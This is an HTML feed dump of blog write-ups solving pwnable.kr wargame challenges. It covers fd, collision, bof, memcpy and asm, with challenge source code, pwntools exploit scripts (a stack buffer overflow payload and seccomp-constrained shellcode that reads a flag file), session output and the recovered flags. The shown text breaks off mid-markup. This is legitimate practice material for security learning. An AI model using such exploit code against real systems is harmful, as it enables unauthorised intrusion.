punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    sizes<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> size<span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ok, lets run the experiment with your configuration\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// run experiment</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    size <span class="token operator">=</span> sizes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"experiment %d : memcpy with buffer size %d\n"</span><span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>    dest <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span> size <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>cache1<span class="token punctuation">,</span> cache2<span class="token punctuation">,</span> <span class="token number">0x4000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// to eliminate cache effect</span>    t1 <span class="token operator">=</span> <span class="token function">rdtsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">slow_memcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> src<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// byte-to-byte memcpy</span>    t2 <span class="token operator">=</span> <span class="token function">rdtsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ellapsed CPU cycles for slow_memcpy : %llu\n"</span><span class="token punctuation">,</span> t2<span class="token operator">-</span>t1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>cache1<span class="token punctuation">,</span> cache2<span class="token punctuation">,</span> <span class="token number">0x4000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// to eliminate cache effect</span>    t1 <span class="token operator">=</span> <span class="token function">rdtsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fast_memcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> src<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// block-to-block memcpy</span>    t2 <span class="token operator">=</span> <span class="token function">rdtsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ellapsed CPU cycles for fast_memcpy : %llu\n"</span><span class="token punctuation">,</span> t2<span class="token operator">-</span>t1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"thanks for helping my experiment!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"flag : ----- erased in this source code -----\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="solve-1"><a href="#solve-1" class="headerlink" title="solve"></a>solve</h2><pre class="line-numbers language-bash"><code class="language-bash">memcpy@ubuntu:~$ nc 0 9022Hey, I have a boring assignment <span class="token keyword">for</span> CS class<span class="token punctuation">..</span> :<span class="token punctuation">(</span>The assignment is simple.------------------------------------------------------ What is the best implementation of memcpy?        -- 1. implement your own slow/fast version of memcpy -- 2. compare them with various size of data         -- 3. conclude your experiment and submit report     ------------------------------------------------------This time, just <span class="token function">help</span> me out with my experiment and get flagNo fancy hacking, I promise :Dspecify the memcpy amount between 8 ~ 16 <span class="token keyword">:</span> 12specify the memcpy amount between 16 ~ 32 <span class="token keyword">:</span> 28specify the memcpy amount between 32 ~ 64 <span class="token keyword">:</span> 60specify the memcpy amount between 64 ~ 128 <span class="token keyword">:</span> 124specify the memcpy amount between 128 ~ 256 <span class="token keyword">:</span> 252specify the memcpy amount between 256 ~ 512 <span class="token keyword">:</span> 508specify the memcpy amount between 512 ~ 1024 <span class="token keyword">:</span> 1020specify the memcpy amount between 1024 ~ 2048 <span class="token keyword">:</span> 2044specify the memcpy amount between 2048 ~ 4096 <span class="token keyword">:</span> 4092specify the memcpy amount between 4096 ~ 8192 <span class="token keyword">:</span> 8188ok, lets run the experiment with your configurationexperiment 1 <span class="token keyword">:</span> memcpy with buffer size 12ellapsed CPU cycles <span class="token keyword">for</span> slow_memcpy <span class="token keyword">:</span> 1662ellapsed CPU cycles <span class="token keyword">for</span> fast_memcpy <span class="token keyword">:</span> 435experiment 2 <span class="token keyword">:</span> memcpy with buffer size 28ellapsed CPU cycles <span class="token keyword">for</span> slow_memcpy <span class="token keyword">:</span> 453ellapsed CPU cycles <span class="token keyword">for</span> fast_memcpy <span class="token keyword">:</span> 498experiment 3 <span class="token keyword">:</span> memcpy with buffer size 60ellapsed CPU cycles <span class="token keyword">for</span> slow_memcpy <span class="token keyword">:</span> 882ellapsed CPU cycles <span class="token keyword">for</span> fast_memcpy <span class="token keyword">:</span> 924experiment 4 <span class="token keyword">:</span> memcpy with buffer size 124ellapsed CPU cycles <span class="token keyword">for</span> slow_memcpy <span class="token keyword">:</span> 1731ellapsed CPU cycles <span class="token keyword">for</span> fast_memcpy <span class="token keyword">:</span> 945experiment 5 <span class="token keyword">:</span> memcpy with buffer size 252ellapsed CPU cycles <span class="token keyword">for</span> slow_memcpy <span class="token keyword">:</span> 3453ellapsed CPU cycles <span class="token keyword">for</span> fast_memcpy <span class="token keyword">:</span> 1029experiment 6 <span class="token keyword">:</span> memcpy with buffer size 508ellapsed CPU cycles <span class="token keyword">for</span> slow_memcpy <span class="token keyword">:</span> 7287ellapsed CPU cycles <span class="token keyword">for</span> fast_memcpy <span class="token keyword">:</span> 1029experiment 7 <span class="token keyword">:</span> memcpy with buffer size 1020ellapsed CPU cycles <span class="token keyword">for</span> slow_memcpy <span class="token keyword">:</span> 13728ellapsed CPU cycles <span class="token keyword">for</span> fast_memcpy <span class="token keyword">:</span> 1131experiment 8 <span class="token keyword">:</span> memcpy with buffer size 2044ellapsed CPU cycles <span class="token keyword">for</span> slow_memcpy <span class="token keyword">:</span> 27411ellapsed CPU cycles <span class="token keyword">for</span> fast_memcpy <span class="token keyword">:</span> 1512experiment 9 <span class="token keyword">:</span> memcpy with buffer size 4092ellapsed CPU cycles <span class="token keyword">for</span> slow_memcpy <span class="token keyword">:</span> 57345ellapsed CPU cycles <span class="token keyword">for</span> fast_memcpy <span class="token keyword">:</span> 2376experiment 10 <span class="token keyword">:</span> memcpy with buffer size 8188ellapsed CPU cycles <span class="token keyword">for</span> slow_memcpy <span class="token keyword">:</span> 121659ellapsed CPU cycles <span class="token keyword">for</span> fast_memcpy <span class="token keyword">:</span> 3969thanks <span class="token keyword">for</span> helping my experiment<span class="token operator">!</span>flag <span class="token keyword">:</span> 1_w4nn4_br34K_th3_m3m0ry_4lignm3nt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h2><pre class="line-numbers language-bash"><code class="language-bash">1_w4nn4_br34K_th3_m3m0ry_4lignm3nt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="15-asm"><a href="#15-asm" class="headerlink" title="15.asm"></a>15.asm</h1><h2 id="question-2"><a href="#question-2" class="headerlink" title="question"></a>question</h2><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;seccomp.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/prctl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">define</span> LENGTH 128</span><span class="token keyword">void</span> <span class="token function">sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  scmp_filter_ctx ctx <span class="token operator">=</span> <span class="token function">seccomp_init</span><span class="token punctuation">(</span>SCMP_ACT_KILL<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>ctx <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"seccomp error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> SCMP_ACT_ALLOW<span class="token punctuation">,</span> <span class="token function">SCMP_SYS</span><span class="token punctuation">(</span>open<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> SCMP_ACT_ALLOW<span class="token punctuation">,</span> <span class="token function">SCMP_SYS</span><span class="token punctuation">(</span>read<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> SCMP_ACT_ALLOW<span class="token punctuation">,</span> <span class="token function">SCMP_SYS</span><span class="token punctuation">(</span>write<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> SCMP_ACT_ALLOW<span class="token punctuation">,</span> <span class="token function">SCMP_SYS</span><span class="token punctuation">(</span>exit<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> SCMP_ACT_ALLOW<span class="token punctuation">,</span> <span class="token function">SCMP_SYS</span><span class="token punctuation">(</span>exit_group<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">seccomp_load</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token function">seccomp_release</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"seccomp error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token function">seccomp_release</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">char</span> stub<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff"</span><span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> filter<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> _IOLBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome to shellcoding practice challenge.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"If this does not challenge you. you should play 'asg' challenge :)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">char</span><span class="token operator">*</span> sh <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0x41414000</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> MAP_ANONYMOUS <span class="token operator">|</span> MAP_FIXED <span class="token operator">|</span> MAP_PRIVATE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>sh<span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>sh<span class="token punctuation">,</span> stub<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>stub<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> offset <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>stub<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"give me your x64 shellcode: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> sh<span class="token operator">+</span>offset<span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">alarm</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">chroot</span><span class="token punctuation">(</span><span class="token string">"/home/asm_pwn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// you are in chroot jail. so you can't use symlink in /tmp</span>  <span class="token function">sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="solve-2"><a href="#solve-2" class="headerlink" title="solve"></a>solve</h2><p>first open the file ,than read,from rax to rsp from 100B,print the context from rsp.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/user/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>con <span class="token operator">=</span> ssh<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'pwnable.kr'</span><span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token string">'asm'</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">'guest'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">2222</span><span class="token punctuation">)</span>p <span class="token operator">=</span> con<span class="token punctuation">.</span>connect_remote<span class="token punctuation">(</span><span class="token string">'localhost'</span><span class="token punctuation">,</span> <span class="token number">9026</span><span class="token punctuation">)</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> <span class="token string">""</span>shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">'rax'</span><span class="token punctuation">,</span> <span class="token string">'rsp'</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'rsp'</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print shellcode</span><span class="token keyword">print</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h2><pre class="line-numbers language-bash"><code class="language-bash">Mak1ng_shelLcodE_i5_veRy_eaSy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> bin </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> pwnable.kr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.kr_1</title>
      <link href="/2018/07/27/pwnable-kr-1/"/>
      <url>/2018/07/27/pwnable-kr-1/</url>
      
        <content type="html"><![CDATA[<h1 id="1-fd"><a href="#1-fd" class="headerlink" title="1.[fd]"></a>1.[fd]</h1><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2><p>ssh the server.and see three files.fd,fd.c,flag.</p><a id="more"></a><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>argc<span class="token operator">&lt;</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pass argv[1] a number\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1234</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  len <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"LETMEWIN\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"good job :)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"learn about Linux file IO\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>it’s say how to make function read to work.<br>it’s two func,atoi and read.</p><p>0x1235=4661</p><pre class="line-numbers language-bash"><code class="language-bash">./fd 4661LETMEWIN\n<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>flag</p><pre><code>mommy! I think I know what a file descriptor is!!</code></pre><h1 id="2-collision"><a href="#2-collision" class="headerlink" title="2.collision"></a>2.collision</h1><h2 id="solve-1"><a href="#solve-1" class="headerlink" title="solve"></a>solve</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>k<span class="token operator">=</span>p32<span class="token punctuation">(</span>h<span class="token number">-0x01010101</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x01010101</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span>p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'./col'</span><span class="token punctuation">,</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>flag</p><pre><code>daddy! I just managed to create a hash collision :)</code></pre><h1 id="3-bof"><a href="#3-bof" class="headerlink" title="3.bof"></a>3.bof</h1><h2 id="solve-2"><a href="#solve-2" class="headerlink" title="solve"></a>solve</h2><p>overflow</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># encoding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>ip<span class="token operator">=</span><span class="token string">'pwnable.kr'</span>port<span class="token operator">=</span><span class="token number">9000</span>p<span class="token operator">=</span>remote<span class="token punctuation">(</span>ip<span class="token punctuation">,</span>port<span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x2c</span><span class="token operator">+</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0xcafebabe</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="4-flag"><a href="#4-flag" class="headerlink" title="4.flag"></a>4.flag</h1><p>re</p><h2 id="solve-3"><a 